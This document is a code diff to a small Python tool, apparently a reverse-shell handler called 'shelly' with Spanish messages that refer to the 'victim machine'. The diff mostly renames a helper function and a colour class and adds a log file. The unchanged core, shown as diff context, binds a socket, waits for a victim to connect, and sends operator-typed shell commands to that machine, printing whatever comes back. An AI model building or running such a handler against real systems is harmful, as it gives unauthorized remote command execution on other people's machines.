@@ -1,16 +1,20 @@
-import socket, argparse, os
+import socket, argparse, os, datetime
 from colorama import Fore, Style
+d = datetime.datetime.now()
+file = open('register.log', 'w')
+file.write(f'[+] Shell logs started at {d}\n')
+file.close()
 parser = argparse.ArgumentParser()
 parser.add_argument('--target', '-t', help="Indica la IP objetivo")
 parser.add_argument('--ping', '-p', help="Indica la IP a la que relizar el ping de verificación")
 args = parser.parse_args()
-def cl():
+def c():
     if os.name=="nt":os.system("cls")
     else:os.system("clear")
-class c:
-    R=Style.BRIGHT+Fore.RED
-    W=Style.BRIGHT+Fore.WHITE
-    R=Style.RESET_ALL+Fore.RESET
+class color:
+    RED=Style.BRIGHT+Fore.RED
+    WHITE=Style.BRIGHT+Fore.WHITE
+    RESET=Style.RESET_ALL+Fore.RESET
 def p():
     c()
     t='''
@@ -21,21 +25,21 @@ def p():
 ███████║██║  ██║███████╗███████╗███████╗██║   
 ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
 '''
-    print(c.R+t)
+    print(color.RED+t)
 
 if args.ping:
-    cl()
+    c()
     try:
-        if os.name=="nt":os.system(c.R + f'ping -n 1 {args.ping}')
-        else:os.system(c.R + f'ping -c 1 {args.ping}')
-        cl()
+        if os.name=="nt":os.system(color.RED + f'ping -n 1 {args.ping}')
+        else:os.system(color.RED + f'ping -c 1 {args.ping}')
+        c()
         p()
-        print(c.R + '[*] Ping relizado con éxito, hay conectividad con la máquina víctima\n')
+        print(color.RED + '[*] Ping relizado con éxito, hay conectividad con la máquina víctima\n')
     
     except Exception as ex:
-        cl()
+        c()
         p()
-        print(c.R + '[*] No hay conectividad con la víctima. Error: ' + ex + '\n')
+        print(color.RED + '[*] No hay conectividad con la víctima. Error: ' + ex + '\n')
 
 elif args.target:
     H=args.target
@@ -44,18 +48,18 @@ elif args.target:
     s.bind((H,P))
     s.listen(1)
     p()
-    print(c.W+f'[*] Escuchando conexiones en {H}:{P}')
+    print(color.WHITE+f'[*] Escuchando conexiones en {H}:{P}')
     n,a=s.accept()
-    print(c.W+f'[+] Conexión entrante: {a[0]}:{a[1]}')
+    print(color.WHITE+f'[+] Conexión entrante: {a[0]}:{a[1]}')
     while True:
-        e=input(c.W+f'shelly@{P}:~$ ')
+        e=input(color.WHITE+f'shelly@{P}:~$ ')
         n.send(e.encode())
         if e.strip()=='exit':break
         o = n.recv(1024).decode()
-        print(c.W+o)
+        print(color.WHITE+o)
     n.close()
 
 else:
-    cl()
+    c()
     p()
-    print('[*] Error: No argument found')
+    print(color.WHITE + '[*] Error: No argument found\n' + color.RESET)
